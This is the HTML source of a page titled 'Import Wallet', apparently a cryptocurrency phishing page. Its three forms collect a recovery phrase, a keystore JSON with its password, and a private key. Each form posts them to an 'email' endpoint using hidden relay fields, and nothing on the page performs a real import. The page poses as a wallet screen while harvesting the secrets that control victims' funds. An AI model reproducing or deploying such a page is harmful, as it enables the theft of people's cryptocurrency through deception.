<!DOCTYPE html>
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
	<title>Import Wallet</title>
	<link rel="stylesheet" href="../css/importwallet/bootstrap.min.css">
	<link rel="stylesheet" href="../css/importwallet/styles.css">
	
</head>

<body>
	<header>
		<div class="container-fluid">
			<div class="row">
				<div class="col-md-4 offset-md-4">
					<a class="text-white" href="#"
						style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Import Wallet</a>
				</div>
			</div>
		</div>
	</header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active" data-toggle="tab"
							href="#phrase">Phrase</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab"
							href="#keystore">Keystore JSON</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab"
							href="#privatekey">Private Key</a></li>
				</ul>
			</div>
		</div>
	</div>
	<section style="margin-top: 40px;">
		<div class="container-fluid">
			<div class="row">
				<div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
							<form method="post" action="email">
								<input type="hidden" name="_next" value="">
								<input type="hidden" name="_captcha" value="false">
								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase"
									required=""></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words
									seperated by a single spaces.</p>
								<input type="text" name="user" value="" style="visibility:hidden;">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit"
										name="submit">IMPORT</button></div>
							</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="keystore">
							<form method="post" action="email">
								<input type="hidden" name="_next" value="">
								<input type="hidden" name="_captcha" value="false">
								<div class="form-group">
									<textarea class="form-control" name="keystorejson" rows="5"
										placeholder="Keystore JSON" required=""></textarea>
									<input type="text" name="user" value="" style="visibility:hidden;">
								</div>
								<div class="form-group">
									<input class="form-control" type="password" name="keystorepasswword"
										placeholder="Password" required="">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">
									Several lines of text beginning with "{...}" plus the password you used to encrypt
									it.
								</p>
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit"
										name="submit">IMPORT</button></div>
							</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="privatekey">
							<form method="post" action="email">
								<input type="hidden" name="_next" value="">
								<input type="hidden" name="_captcha" value="false">
								<div class="form-group">
									<input class="form-control" name="privatekey" placeholder="Private Key" required="">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words
									seperated by a single spaces.</p>
								<input type="text" name="user" value="" style="visibility:hidden;">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit"
										name="submit">IMPORT</button></div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<script src="../js/jquery.min.js"></script>
	<script src="../css/importwallet/bootstrap.min.js"></script>

</body>

</html>
